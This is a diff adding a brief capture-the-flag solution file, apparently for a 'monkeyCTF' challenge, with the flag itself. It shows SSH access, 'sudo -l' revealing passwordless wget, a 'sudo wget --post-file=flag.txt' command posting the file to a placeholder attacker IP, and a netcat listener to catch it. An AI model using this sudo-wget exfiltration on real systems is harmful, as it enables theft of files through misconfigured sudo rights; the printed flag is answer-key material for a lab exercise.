@@ -1,0 +1,18 @@
+CHALLENGE SOLUTION:
+-------------------
+ssh -p (port) (username)@(hostname)
+
+sudo -l, shows all sudo commands allowed for this user
+	(root) NOPASSWD: /usr/bin/wget
+
+
+VICTIM MACHINE:
+---------------
+sudo /usr/bin/wget --post-file=flag.txt http://LOCAL-IP:8000/ 
+
+
+ATTACK MACHINE:
+---------------
+nc -lvnp 8000
+
+FLAG: monkeyCTF{badsudoprivs}
